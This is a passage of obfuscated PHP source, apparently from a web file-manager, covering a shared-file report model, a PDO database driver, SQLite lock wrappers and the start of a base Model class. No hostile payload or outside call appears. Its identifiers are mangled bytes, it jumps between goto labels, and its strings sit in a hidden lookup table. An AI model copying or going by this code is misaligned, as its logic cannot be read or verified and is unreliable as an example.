=> array($û¾±øÀ[476], $Ê™¶É)); $this->where($´ÜÄú·ë)->delete(); Model($û¾±øÀ[650])->where($´ÜÄú·ë)->delete(); } public function listAll($„ÈÎûŒÎ) { $ÏÇ—ôØ =& $_SERVER[Õò”†—·]; $Ú¸şåĞÓ = array(); if ($„ÈÎûŒÎ[$ÏÇ—ôØ[1755]]) { $Ú¸şåĞÓ[$ÏÇ—ôØ[1755]] = $„ÈÎûŒÎ[$ÏÇ—ôØ[1755]]; } if ($„ÈÎûŒÎ[$ÏÇ—ôØ[811]]) { $ÎŒÕ®¿Ë = $„ÈÎûŒÎ[$ÏÇ—ôØ[812]] ? $„ÈÎûŒÎ[$ÏÇ—ôØ[812]] : strtotime(date($ÏÇ—ôØ[2129])); $Ú¸şåĞÓ[$ÏÇ—ôØ[232]] = array($ÏÇ—ôØ[393], array($„ÈÎûŒÎ[$ÏÇ—ôØ[811]], $ÎŒÕ®¿Ë)); } if ($„ÈÎûŒÎ[$ÏÇ—ôØ[43]]) { $Ú¸şåĞÓ[$„ÈÎûŒÎ[$ÏÇ—ôØ[43]]] = 1; } else { $Ú¸şåĞÓ[] = array($ÏÇ—ôØ[547] => array($ÏÇ—ôØ[1062], 0), $ÏÇ—ôØ[647] => array($ÏÇ—ôØ[1062], 0), $ÏÇ—ôØ[2103] => $ÏÇ—ôØ[2056]); } if ($„ÈÎûŒÎ[$ÏÇ—ôØ[2052]]) { $Ú¸şåĞÓ[] = array($ÏÇ—ôØ[2100] => $„ÈÎûŒÎ[$ÏÇ—ôØ[2052]], $ÏÇ—ôØ[1643] => array($ÏÇ—ôØ[443], "\45{$„ÈÎûŒÎ[$ÏÇ—ôØ[2052]]}\x25"), $ÏÇ—ôØ[2103] => $ÏÇ—ôØ[2056]); } $™ãÂŒèÄ = $this->_makeOrder()->where($Ú¸şåĞÓ)->selectPage(20); if (empty($™ãÂŒèÄ[$ÏÇ—ôØ[429]])) { return array(); } $this->_listDataApply($™ãÂŒèÄ[$ÏÇ—ôØ[429]]); return $™ãÂŒèÄ; } public function listDataApply($·¾æÖğ) { $this->_listDataApply($·¾æÖğ); return $·¾æÖğ; } private function _listDataApply(&$÷Ã˜İĞÛ) { $ı”¨†îá =& $_SERVER[Õò”†—·]; $»Şæá¥¸ = array_to_keyvalue($÷Ã˜İĞÛ, $ı”¨†îá[22], $ı”¨†îá[1755]); $¾ë‡¸£ = Model($ı”¨†îá[583])->userListInfo(array_unique($»Şæá¥¸)); $’˜¶² = array_to_keyvalue($÷Ã˜İĞÛ, $ı”¨†îá[22], $ı”¨†îá[194]); $íùĞ¤¯• = Model($ı”¨†îá[875])->sourceListInfo($’˜¶², !0); foreach ($÷Ã˜İĞÛ as $âƒ­¿ => &$ÕÀùâöƒ) { $ÌæÇß¶ = $ÕÀùâöƒ[$ı”¨†îá[1755]]; $ÕÀùâöƒ[$ı”¨†îá[2130]] = $¾ë‡¸£[$ÌæÇß¶] ? $¾ë‡¸£[$ÌæÇß¶] : !1; $ÕÄ´› = $ÕÀùâöƒ[$ı”¨†îá[194]]; $ÕÀùâöƒ[$ı”¨†îá[100]] = $íùĞ¤¯•[$ÕÄ´›] ? $íùĞ¤¯•[$ÕÄ´›] : !1; if ($ÕÀùâöƒ[$ı”¨†îá[100]][$ı”¨†îá[489]] == $ı”¨†îá[101]) { unset($÷Ã˜İĞÛ[$âƒ­¿]); } if ($ÕÀùâöƒ[$ı”¨†îá[100]] != $ı”¨†îá[229] && !$ÕÀùâöƒ[$ı”¨†îá[100]]) { unset($÷Ã˜İĞÛ[$âƒ­¿]); } } unset($ÕÀùâöƒ); $÷Ã˜İĞÛ = array_values($÷Ã˜İĞÛ); } private function _makeOrder($Óã™Ğ¼ = '') { $Ìş·‰Ñß =& $_SERVER[Õò”†—·]; $ÀÑ†¥™ª = array($Ìş·‰Ñß[232], $Ìş·‰Ñß[812], $Ìş·‰Ñß[2117], $Ìş·‰Ñß[2118]); $ñ¡¡ÛÛô = array($Ìş·‰Ñß[507] => $Ìş·‰Ñß[508], $Ìş·‰Ñß[509] => $Ìş·‰Ñß[510]); $‘ÄÅûú¨ = Input::get($Ìş·‰Ñß[514], $Ìş·‰Ñß[17], $Ìş·‰Ñß[481], $ÀÑ†¥™ª); $Â‹Ÿ¡€ = Input::get($Ìş·‰Ñß[515], $Ìş·‰Ñß[17], $Ìş·‰Ñß[2131], array($Ìş·‰Ñß[2049], $Ìş·‰Ñß[509])); $Â‹Ÿ¡€ = $ñ¡¡ÛÛô[$Â‹Ÿ¡€]; $Óã™Ğ¼ = $Óã™Ğ¼ . "{$‘ÄÅûú¨}\40{$Â‹Ÿ¡€}"; return $this->order($Óã™Ğ¼); } public function reportAdd($·ÔªÑƒõ) { $¨¥”ÀŸë =& $_SERVER[Õò”†—·]; $ñÇ†ğ¾¸ = array($¨¥”ÀŸë[649] => $·ÔªÑƒõ[$¨¥”ÀŸë[649]], $¨¥”ÀŸë[1755] => USER_ID); if (Model($¨¥”ÀŸë[2127])->where($ñÇ†ğ¾¸)->find()) { return !1; } $áıöú¨Ã = array($¨¥”ÀŸë[649] => $·ÔªÑƒõ[$¨¥”ÀŸë[649]], $¨¥”ÀŸë[1643] => $·ÔªÑƒõ[$¨¥”ÀŸë[1643]], $¨¥”ÀŸë[194] => $·ÔªÑƒõ[$¨¥”ÀŸë[194]], $¨¥”ÀŸë[525] => $·ÔªÑƒõ[$¨¥”ÀŸë[525]], $¨¥”ÀŸë[1755] => USER_ID, $¨¥”ÀŸë[43] => $·ÔªÑƒõ[$¨¥”ÀŸë[43]], $¨¥”ÀŸë[510] => $·ÔªÑƒõ[$¨¥”ÀŸë[510]]); return Model($¨¥”ÀŸë[2127])->add($áıöú¨Ã); } public function reportList($€îªã†È) { $ˆ·¦¤ìé =& $_SERVER[Õò”†—·]; $Å®•”êÙ = array(); if ($€îªã†È[$ˆ·¦¤ìé[811]]) { $‹´œ°í÷ = $€îªã†È[$ˆ·¦¤ìé[812]] ? $€îªã†È[$ˆ·¦¤ìé[812]] : strtotime(date($ˆ·¦¤ìé[2129])); $Å®•”êÙ[$ˆ·¦¤ìé[232]] = array($ˆ·¦¤ìé[393], array($€îªã†È[$ˆ·¦¤ìé[811]], $‹´œ°í÷)); } if (isset($€îªã†È[$ˆ·¦¤ìé[43]]) && in_array($€îªã†È[$ˆ·¦¤ìé[43]], array($ˆ·¦¤ìé[101], $ˆ·¦¤ìé[494], $ˆ·¦¤ìé[2132], $ˆ·¦¤ìé[2133], $ˆ·¦¤ìé[2134]))) { $Å®•”êÙ[$ˆ·¦¤ìé[43]] = $€îªã†È[$ˆ·¦¤ìé[43]]; } if (isset($€îªã†È[$ˆ·¦¤ìé[801]]) && in_array($€îªã†È[$ˆ·¦¤ìé[801]], array($ˆ·¦¤ìé[229], $ˆ·¦¤ìé[101], $ˆ·¦¤ìé[494], $ˆ·¦¤ìé[2132]))) { $Å®•”êÙ[$ˆ·¦¤ìé[801]] = $€îªã†È[$ˆ·¦¤ìé[801]]; } $êÑËü¾­ = Input::get($ˆ·¦¤ìé[515], $ˆ·¦¤ìé[17], $ˆ·¦¤ìé[2131], array($ˆ·¦¤ìé[2049], $ˆ·¦¤ìé[509])); $¬üÄµ¦Ş = array($ˆ·¦¤ìé[507] => $ˆ·¦¤ìé[508], $ˆ·¦¤ìé[509] => $ˆ·¦¤ìé[510]); $éÑ½Æ = $ˆ·¦¤ìé[2135] . $¬üÄµ¦Ş[$êÑËü¾­]; $õ¼£î¼Æ = Model($ˆ·¦¤ìé[2127])->where($Å®•”êÙ)->order($éÑ½Æ)->selectPage(20); if (empty($õ¼£î¼Æ[$ˆ·¦¤ìé[429]])) { return array(); } $Ëêƒóì = array_to_keyvalue_group($õ¼£î¼Æ[$ˆ·¦¤ìé[429]], $ˆ·¦¤ìé[801], $ˆ·¦¤ìé[649]); if (!empty($Ëêƒóì[0])) { $€îªã†È = $Ëêƒóì[0]; $Å®•”êÙ = array($ˆ·¦¤ìé[649] => array($ˆ·¦¤ìé[17], $€îªã†È)); $õÂŒÓËê = $this->where($Å®•”êÙ)->field($ˆ·¦¤ìé[649])->select(); $õÂŒÓËê = array_to_keyvalue($õÂŒÓËê, $ˆ·¦¤ìé[22], $ˆ·¦¤ìé[649]); $òõ–ÕÑš = array_diff($€îªã†È, $õÂŒÓËê); if (!empty($òõ–ÕÑš)) { foreach ($õ¼£î¼Æ[$ˆ·¦¤ìé[429]] as $å¶ıİ  => $‡Ä¬õ²ã) { if (in_array($‡Ä¬õ²ã[$ˆ·¦¤ìé[649]], $òõ–ÕÑš)) { unset($õ¼£î¼Æ[$ˆ·¦¤ìé[429]][$å¶ıİ ]); } } } } $this->_listDataApply($õ¼£î¼Æ[$ˆ·¦¤ìé[429]]); return $õ¼£î¼Æ; } public function reportStatus($ëÒ‰ÜÄ) { $¥’ï¼˜é =& $_SERVER[Õò”†—·]; $¶¾†¨ê¦ = array($¥’ï¼˜é[459] => $ëÒ‰ÜÄ[$¥’ï¼˜é[459]]); $Ñî›ú‹À = Model($¥’ï¼˜é[2127])->where($¶¾†¨ê¦)->field($¥’ï¼˜é[2136])->find(); if (!$Ñî›ú‹À) { return !1; } $éºê££ = array($¥’ï¼˜é[801] => $ëÒ‰ÜÄ[$¥’ï¼˜é[801]]); if ($ëÒ‰ÜÄ[$¥’ï¼˜é[801]] == $¥’ï¼˜é[2132] && $Ñî›ú‹À[$¥’ï¼˜é[801]] == $¥’ï¼˜é[2132]) { $éºê££[$¥’ï¼˜é[801]] = 0; } $Õü¨‹‚ = Model($¥’ï¼˜é[2127])->where($¶¾†¨ê¦)->save($éºê££); if ($ëÒ‰ÜÄ[$¥’ï¼˜é[801]] == $¥’ï¼˜é[494]) { if ($Ñî›ú‹À[$¥’ï¼˜é[525]] != $¥’ï¼˜é[229] && $this->shareFileMeta($Ñî›ú‹À[$¥’ï¼˜é[525]])) { $this->shareFileMeta($Ñî›ú‹À[$¥’ï¼˜é[525]], 0); } $this->remove($Ñî›ú‹À[$¥’ï¼˜é[649]]); return !0; } if ($Õü¨‹‚ && $ëÒ‰ÜÄ[$¥’ï¼˜é[801]] == $¥’ï¼˜é[2132]) { $İìõÎ‡ = $éºê££[$¥’ï¼˜é[801]] == $¥’ï¼˜é[2132] ? 1 : 0; $this->shareFileMeta($Ñî›ú‹À[$¥’ï¼˜é[525]], $İìõÎ‡); $this->removeByFile($Ñî›ú‹À[$¥’ï¼˜é[525]]); } return $Õü¨‹‚; } private function removeByFile($¼Îª®ÈÁ) { $®ÀÍÄÊÃ =& $_SERVER[Õò”†—·]; $¦¼ÆØä = Model($®ÀÍÄÊÃ[875])->where(array($®ÀÍÄÊÃ[525] => $¼Îª®ÈÁ))->field($®ÀÍÄÊÃ[194])->select(); $Ã¡¥˜Õ = array_to_keyvalue($¦¼ÆØä, $®ÀÍÄÊÃ[22], $®ÀÍÄÊÃ[194]); $×ÕŸ¯¯˜ = array($®ÀÍÄÊÃ[194] => array($®ÀÍÄÊÃ[17], $Ã¡¥˜Õ), $®ÀÍÄÊÃ[547] => 1); $¦¼ÆØä = $this->where($×ÕŸ¯¯˜)->field($®ÀÍÄÊÃ[649])->select(); if (empty($¦¼ÆØä)) { return; } $Ûƒ”İŒ‡ = array_to_keyvalue($¦¼ÆØä, $®ÀÍÄÊÃ[22], $®ÀÍÄÊÃ[649]); $this->remove($Ûƒ”İŒ‡); } private function shareFileMeta($·¥ˆåÊä, $²ÆûÏ×Ä = null) { $­Ş“Îì’ =& $_SERVER[Õò”†—·]; $Ó¿ºÖÔ÷ = array($­Ş“Îì’[525] => $·¥ˆåÊä, $­Ş“Îì’[107] => $­Ş“Îì’[2137]); if (is_null($²ÆûÏ×Ä)) { return Model($­Ş“Îì’[2138])->where($Ó¿ºÖÔ÷)->find(); } $Ó¿ºÖÔ÷[$­Ş“Îì’[434]] = $²ÆûÏ×Ä; Model($­Ş“Îì’[2138])->add($Ó¿ºÖÔ÷, array(), !0); } } goto AèğÌšîóã; eÍ›ğ«‰Ù÷: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($£¥È™   = '') { $©øË¦ü› =& $_SERVER[Õò”†—·]; if (!class_exists($©øË¦ü›[964])) { think_exception(think_lang($©øË¦ü›[24]) . $©øË¦ü›[965]); } if (!empty($£¥È™  )) { $this->config = $£¥È™  ; if (empty($this->config[$©øË¦ü›[27]])) { $this->config[$©øË¦ü›[27]] = array(); } } } public function connect($Ïèƒ = '', $¸§°£„à = 0) { $ª®Ú¿½ =& $_SERVER[Õò”†—·]; if (!isset($this->linkID[$¸§°£„à])) { if (empty($Ïèƒ)) { $Ïèƒ = $this->config; } $õ‹–‘Òó = !empty($Ïèƒ[$ª®Ú¿½[27]][$ª®Ú¿½[28]]) ? $Ïèƒ[$ª®Ú¿½[27]][$ª®Ú¿½[28]] : $this->pconnect; if ($õ‹–‘Òó) { $Ïèƒ[$ª®Ú¿½[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¸§°£„à] = new PDO($Ïèƒ[$ª®Ú¿½[966]], $Ïèƒ[$ª®Ú¿½[938]], $Ïèƒ[$ª®Ú¿½[939]], $Ïèƒ[$ª®Ú¿½[27]]); } catch (PDOException $Ç†¡¨©²) { think_exception($Ç†¡¨©²->getMessage()); } $this->dbType = $this->_getDsnType($Ïèƒ[$ª®Ú¿½[966]]); if (in_array($this->dbType, array($ª®Ú¿½[967], $ª®Ú¿½[968], $ª®Ú¿½[969], $ª®Ú¿½[970]))) { think_exception($ª®Ú¿½[971] . $this->dbType . $ª®Ú¿½[972] . $this->dbType . $ª®Ú¿½[973]); } if (!$this->linkID[$¸§°£„à]) { think_exception($ª®Ú¿½[974]); } try { $this->linkID[$¸§°£„à]->exec($ª®Ú¿½[975] . think_config($ª®Ú¿½[941])); } catch (Exception $Ç†¡¨©²) { } $this->connected = !0; if (1 != think_config($ª®Ú¿½[32])) { unset($this->config); } } return $this->linkID[$¸§°£„à]; } public function free() { $this->PDOStatement = null; } public function query($µ†—Ğ¤·, $’ßÀâõ = array()) { $©¿ÃÌÆ¿ =& $_SERVER[Õò”†—·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $µ†—Ğ¤·; if (!empty($’ßÀâõ)) { $this->queryStr .= $©¿ÃÌÆ¿[976] . print_r($’ßÀâõ, !0) . $©¿ÃÌÆ¿[977]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($©¿ÃÌÆ¿[33], 1); think_status($©¿ÃÌÆ¿[34]); $this->PDOStatement = $this->_linkID->prepare($µ†—Ğ¤·); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ñ¾³Òå¬ = $this->PDOStatement->execute($’ßÀâõ); $this->debug(); if (!1 === $ñ¾³Òå¬) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($´ŸÆ•ÙÑ, $£ÈŞ¶‰¶ = array()) { $Ù–Ëæø„ =& $_SERVER[Õò”†—·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´ŸÆ•ÙÑ; if (!empty($£ÈŞ¶‰¶)) { $this->queryStr .= $Ù–Ëæø„[976] . print_r($£ÈŞ¶‰¶, !0) . $Ù–Ëæø„[977]; } $˜˜®Êº÷ = !1; if ($this->dbType == $Ù–Ëæø„[970]) { if (preg_match($Ù–Ëæø„[978], $this->queryStr, $“üïºæØ)) { $this->table = think_config($Ù–Ëæø„[979]) . str_ireplace(think_config($Ù–Ëæø„[980]), $Ù–Ëæø„[438], $“üïºæØ[2]); $˜˜®Êº÷ = (bool) $this->query($Ù–Ëæø„[981] . strtoupper($this->table) . $Ù–Ëæø„[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ù–Ëæø„[35], 1); think_status($Ù–Ëæø„[34]); $this->PDOStatement = $this->_linkID->prepare($´ŸÆ•ÙÑ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÄÚ¦Ï¢İ = $this->PDOStatement->execute($£ÈŞ¶‰¶); $this->debug(); if (!1 === $ÄÚ¦Ï¢İ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($˜˜®Êº÷ || preg_match($Ù–Ëæø„[982], $´ŸÆ•ÙÑ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $şáœ“Ä¸ = $this->_linkID->commit(); $this->transTimes = 0; if (!$şáœ“Ä¸) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶âÏÖåú = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¶âÏÖåú) { $this->error(); return !1; } } return !0; } private function getAll() { $ÑÔûßÅä = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÑÔûßÅä); return $ÑÔûßÅä; } public function getFields($Ë—¿Êã‚) { $¼û§œåÎ =& $_SERVER[Õò”†—·]; $this->initConnect(!0); if (think_config($¼û§œåÎ[983])) { $™±™±„Í = str_replace($¼û§œåÎ[984], $Ë—¿Êã‚, think_config($¼û§œåÎ[983])); } else { switch ($this->dbType) { case $¼û§œåÎ[967]: case $¼û§œåÎ[985]: $™±™±„Í = "\123\x45\114\x45\103\124\40\x20\x20\x63\157\154\x75\x6d\x6e\137\x6e\x61\155\145\x20\x61\x73\40\x27\116\141\155\145\47\54\40\x20\40\144\x61\164\141\137\164\171\160\145\40\141\163\40\x27\x54\x79\x70\x65\x27\x2c\40\40\40\x63\157\x6c\x75\x6d\x6e\x5f\144\145\146\x61\165\x6c\x74\40\x61\163\40\x27\x44\145\146\x61\x75\x6c\164\47\x2c\x20\x20\40\151\163\137\x6e\165\154\154\x61\x62\154\x65\40\x61\163\x20\x27\116\165\x6c\154\47\xa\x9\x9\x46\122\117\x4d\x9\x69\156\x66\157\x72\155\x61\x74\x69\157\x6e\x5f\x73\143\x68\145\x6d\141\x2e\x74\141\142\154\x65\x73\40\x41\123\x20\x74\xa\11\11\112\117\111\116\x9\151\x6e\146\x6f\162\x6d\141\x74\151\157\156\137\x73\x63\150\x65\155\x61\x2e\143\x6f\x6c\x75\155\x6e\163\40\101\123\40\x63\xa\11\11\117\x4e\x20\x20\x74\56\x74\141\142\x6c\145\x5f\x63\141\164\141\x6c\157\x67\40\75\x20\x63\56\x74\x61\x62\x6c\x65\137\x63\x61\164\x61\x6c\x6f\x67\12\11\11\101\x4e\x44\x20\x74\x2e\x74\x61\142\154\145\x5f\x73\x63\150\x65\x6d\x61\x20\75\x20\143\x2e\164\x61\142\x6c\x65\137\163\x63\x68\145\x6d\x61\12\11\x9\x41\116\104\x20\164\56\x74\x61\142\x6c\x65\137\x6e\141\x6d\x65\40\75\40\143\x2e\x74\141\142\154\145\137\x6e\141\x6d\x65\xa\x9\11\x57\x48\x45\122\x45\40\x20\40\164\56\164\x61\x62\154\145\137\x6e\x61\155\x65\x20\x3d\40\x27{$Ë—¿Êã‚}\x27"; break; case $¼û§œåÎ[986]: $™±™±„Í = $¼û§œåÎ[987] . $Ë—¿Êã‚ . $¼û§œåÎ[988]; break; case $¼û§œåÎ[968]: case $¼û§œåÎ[970]: $™±™±„Í = $¼û§œåÎ[989] . $¼û§œåÎ[990] . $¼û§œåÎ[991] . strtoupper($Ë—¿Êã‚) . $¼û§œåÎ[992] . strtoupper($Ë—¿Êã‚) . $¼û§œåÎ[993]; break; case $¼û§œåÎ[994]: $™±™±„Í = $¼û§œåÎ[995] . $Ë—¿Êã‚ . $¼û§œåÎ[996]; break; case $¼û§œåÎ[969]: break; case $¼û§œåÎ[997]: default: $™±™±„Í = $¼û§œåÎ[998] . ($this->dbType == $¼û§œåÎ[997] ? "\x60{$Ë—¿Êã‚}\x60" : $Ë—¿Êã‚); } } $´ìéÃó = $this->query($™±™±„Í); $ÒåÜæÖ = array(); if ($´ìéÃó) { foreach ($´ìéÃó as $•“­˜ÌÊ => $ãï¯ûı) { $ãï¯ûı = array_change_key_case($ãï¯ûı); $ãï¯ûı[$¼û§œåÎ[42]] = isset($ãï¯ûı[$¼û§œåÎ[42]]) ? $ãï¯ûı[$¼û§œåÎ[42]] : $¼û§œåÎ[438]; $ãï¯ûı[$¼û§œåÎ[43]] = isset($ãï¯ûı[$¼û§œåÎ[43]]) ? $ãï¯ûı[$¼û§œåÎ[43]] : $¼û§œåÎ[438]; $àœÊÜÔö = isset($ãï¯ûı[$¼û§œåÎ[334]]) ? $ãï¯ûı[$¼û§œåÎ[334]] : $ãï¯ûı[$¼û§œåÎ[42]]; $ÒåÜæÖ[$àœÊÜÔö] = array($¼û§œåÎ[42] => $àœÊÜÔö, $¼û§œåÎ[43] => $ãï¯ûı[$¼û§œåÎ[43]], $¼û§œåÎ[45] => (bool) (isset($ãï¯ûı[$¼û§œåÎ[116]]) && $ãï¯ûı[$¼û§œåÎ[116]] === $¼û§œåÎ[22] || isset($ãï¯ûı[$¼û§œåÎ[45]]) && $ãï¯ûı[$¼û§œåÎ[45]] === $¼û§œåÎ[22]), $¼û§œåÎ[47] => isset($ãï¯ûı[$¼û§œåÎ[47]]) ? $ãï¯ûı[$¼û§œåÎ[47]] : (isset($ãï¯ûı[$¼û§œåÎ[66]]) ? $ãï¯ûı[$¼û§œåÎ[66]] : $¼û§œåÎ[438]), $¼û§œåÎ[49] => isset($ãï¯ûı[$¼û§œåÎ[107]]) ? strtolower($ãï¯ûı[$¼û§œåÎ[107]]) == $¼û§œåÎ[51] : (isset($ãï¯ûı[$¼û§œåÎ[67]]) ? $ãï¯ûı[$¼û§œåÎ[67]] : !1), $¼û§œåÎ[52] => isset($ãï¯ûı[$¼û§œåÎ[999]]) ? strtolower($ãï¯ûı[$¼û§œåÎ[999]]) == $¼û§œåÎ[54] : (isset($ãï¯ûı[$¼û§œåÎ[107]]) ? $ãï¯ûı[$¼û§œåÎ[107]] : !1)); } } return $ÒåÜæÖ; } public function getTables($ìÀº€ã = '') { $èû‰¬‡ñ =& $_SERVER[Õò”†—·]; if (think_config($èû‰¬‡ñ[1000])) { $²…¶ãÜ¥ = str_replace($èû‰¬‡ñ[1001], $ìÀº€ã, think_config($èû‰¬‡ñ[1000])); } else { switch ($this->dbType) { case $èû‰¬‡ñ[968]: case $èû‰¬‡ñ[970]: $²…¶ãÜ¥ = $èû‰¬‡ñ[1002]; break; case $èû‰¬‡ñ[967]: case $èû‰¬‡ñ[985]: $²…¶ãÜ¥ = $èû‰¬‡ñ[1003]; break; case $èû‰¬‡ñ[994]: $²…¶ãÜ¥ = $èû‰¬‡ñ[1004]; break; case $èû‰¬‡ñ[969]: think_exception(think_lang($èû‰¬‡ñ[1005]) . $èû‰¬‡ñ[1006]); break; case $èû‰¬‡ñ[986]: $²…¶ãÜ¥ = $èû‰¬‡ñ[55] . $èû‰¬‡ñ[56] . $èû‰¬‡ñ[57]; break; case $èû‰¬‡ñ[997]: default: if (!empty($ìÀº€ã)) { $²…¶ãÜ¥ = $èû‰¬‡ñ[949] . $ìÀº€ã . $èû‰¬‡ñ[950]; } else { $²…¶ãÜ¥ = $èû‰¬‡ñ[951]; } } } $ı¶Í¸öÚ = $this->query($²…¶ãÜ¥); $Üºª³Æ = array(); foreach ($ı¶Í¸öÚ as $Àç¶—¬– => $…‰˜äéé) { $Üºª³Æ[$Àç¶—¬–] = current($…‰˜äéé); } return $Üºª³Æ; } protected function parseLimit($–ú¬–) { $ŸŸ½«ı =& $_SERVER[Õò”†—·]; $Çƒ›æµ÷ = $ŸŸ½«ı[22]; if (!empty($–ú¬–)) { switch ($this->dbType) { case $ŸŸ½«ı[994]: case $ŸŸ½«ı[986]: $–ú¬– = explode($ŸŸ½«ı[60], $–ú¬–); if (count($–ú¬–) > 1) { $Çƒ›æµ÷ .= $ŸŸ½«ı[61] . $–ú¬–[1] . $ŸŸ½«ı[62] . $–ú¬–[0] . $ŸŸ½«ı[63]; } else { $Çƒ›æµ÷ .= $ŸŸ½«ı[61] . $–ú¬–[0] . $ŸŸ½«ı[63]; } break; case $ŸŸ½«ı[967]: case $ŸŸ½«ı[985]: break; case $ŸŸ½«ı[969]: break; case $ŸŸ½«ı[968]: case $ŸŸ½«ı[970]: break; case $ŸŸ½«ı[997]: default: $Çƒ›æµ÷ .= $ŸŸ½«ı[61] . $–ú¬– . $ŸŸ½«ı[63]; } } return $Çƒ›æµ÷; } public function parseKey(&$ºº˜ñõ, $ÜãõÑªü = true) { $ä¬§¯˜– =& $_SERVER[Õò”†—·]; if ($ÜãõÑªü) { $ºº˜ñõ = $this->parseKeyCheck($ºº˜ñõ); } if ($this->dbType == $ä¬§¯˜–[997]) { if ($ºº˜ñõ != $ä¬§¯˜–[221] && !preg_match($ä¬§¯˜–[961], $ºº˜ñõ)) { $ºº˜ñõ = $ä¬§¯˜–[445] . trim($ºº˜ñõ, $ä¬§¯˜–[445]) . $ä¬§¯˜–[445]; } return $ºº˜ñõ; } else { return parent::parseKey($ºº˜ñõ, $ÜãõÑªü); } } public function close() { $this->_linkID = null; } public function error() { $®˜ö±ÛÓ =& $_SERVER[Õò”†—·]; if ($this->PDOStatement) { $ÙŸâó®à = $this->PDOStatement->errorInfo(); $this->error = $ÙŸâó®à[1] . $®˜ö±ÛÓ[4] . $ÙŸâó®à[2]; } else { $this->error = $®˜ö±ÛÓ[22]; } if ($®˜ö±ÛÓ[22] != $this->queryStr) { $this->error .= LNG($®˜ö±ÛÓ[58]) . $this->queryStr; } think_trace($this->error, $®˜ö±ÛÓ[22], $®˜ö±ÛÓ[59]); return $this->error; } public function escapeString($øÈ™’¤©) { $¿–¥Àæö =& $_SERVER[Õò”†—·]; switch ($this->dbType) { case $¿–¥Àæö[994]: case $¿–¥Àæö[967]: case $¿–¥Àæö[985]: case $¿–¥Àæö[997]: return addslashes($øÈ™’¤©); case $¿–¥Àæö[969]: case $¿–¥Àæö[986]: case $¿–¥Àæö[968]: case $¿–¥Àæö[970]: return str_ireplace($¿–¥Àæö[68], $¿–¥Àæö[69], $øÈ™’¤©); } } protected function parseValue($ÈĞè«Ò¦) { $Ü›Ü¿ê¥ =& $_SERVER[Õò”†—·]; if (is_string($ÈĞè«Ò¦)) { $³ı»ËÕÎ = strpos($ÈĞè«Ò¦, $Ü›Ü¿ê¥[4]) === 0 && in_array($ÈĞè«Ò¦, array_keys($this->bind)); $ÈĞè«Ò¦ = $³ı»ËÕÎ ? $this->escapeString($ÈĞè«Ò¦) : $Ü›Ü¿ê¥[1007] . $this->escapeString($ÈĞè«Ò¦) . $Ü›Ü¿ê¥[1007]; } elseif (isset($ÈĞè«Ò¦[0]) && is_string($ÈĞè«Ò¦[0]) && strtolower($ÈĞè«Ò¦[0]) == $Ü›Ü¿ê¥[357]) { $ÈĞè«Ò¦ = $this->escapeString($ÈĞè«Ò¦[1]); } elseif (is_array($ÈĞè«Ò¦)) { $ÈĞè«Ò¦ = array_map(array($this, $Ü›Ü¿ê¥[1008]), $ÈĞè«Ò¦); } elseif (is_bool($ÈĞè«Ò¦)) { $ÈĞè«Ò¦ = $ÈĞè«Ò¦ ? $Ü›Ü¿ê¥[101] : $Ü›Ü¿ê¥[229]; } elseif (is_null($ÈĞè«Ò¦)) { $ÈĞè«Ò¦ = $Ü›Ü¿ê¥[116]; } return $ÈĞè«Ò¦; } public function getLastInsertId() { $¤í––¨æ =& $_SERVER[Õò”†—·]; switch ($this->dbType) { case $¤í––¨æ[994]: case $¤í––¨æ[986]: case $¤í––¨æ[967]: case $¤í––¨æ[985]: case $¤í––¨æ[969]: case $¤í––¨æ[997]: return $this->_linkID->lastInsertId(); case $¤í––¨æ[968]: case $¤í––¨æ[970]: $ÉªÁê¤í = $this->table; $îßöêğ… = $this->query("\123\x45\x4c\105\103\x54\x20{$ÉªÁê¤í}\x2e\143\x75\x72\162\166\141\154\x20\x63\165\162\x72\x76\x61\154\40\x46\x52\x4f\x4d\x20\x64\165\x61\154"); return $îßöêğ… ? $îßöêğ…[0][$¤í––¨æ[1009]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ğûø¢ÜÑ) { $Î¾ÒµÏ‘ =& $_SERVER[Õò”†—·]; if (!CacheLock::fileLock($Î¾ÒµÏ‘[23])) { return !1; } $…›½¯¦Â = parent::query($ğûø¢ÜÑ); CacheLock::fileUnLock($Î¾ÒµÏ‘[23]); return $…›½¯¦Â; } public function execute($ÇŸ”ª”·) { $úĞ÷ÇÍÀ =& $_SERVER[Õò”†—·]; if (!CacheLock::fileLock($úĞ÷ÇÍÀ[23])) { return !1; } $“Ñêİ‹ = parent::execute($ÇŸ”ª”·); CacheLock::fileUnLock($úĞ÷ÇÍÀ[23]); return $“Ñêİ‹; } } class DbSqlite3 extends DbSqlite3Base { public function query($éÇÏ˜£õ) { $±±°óÆ =& $_SERVER[Õò”†—·]; if (!CacheLock::fileLock($±±°óÆ[23])) { return !1; } $ÓğŒ’©Ë = parent::query($éÇÏ˜£õ); CacheLock::fileUnLock($±±°óÆ[23]); return $ÓğŒ’©Ë; } public function execute($àô©éÎ) { $¼ıºÕúœ =& $_SERVER[Õò”†—·]; if (!CacheLock::fileLock($¼ıºÕúœ[23])) { return !1; } $¼©æºû‚ = parent::execute($àô©éÎ); CacheLock::fileUnLock($¼ıºÕúœ[23]); return $¼©æºû‚; } } goto a‹æ¯‹Ê; aÏŒİÚ²îÃ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected 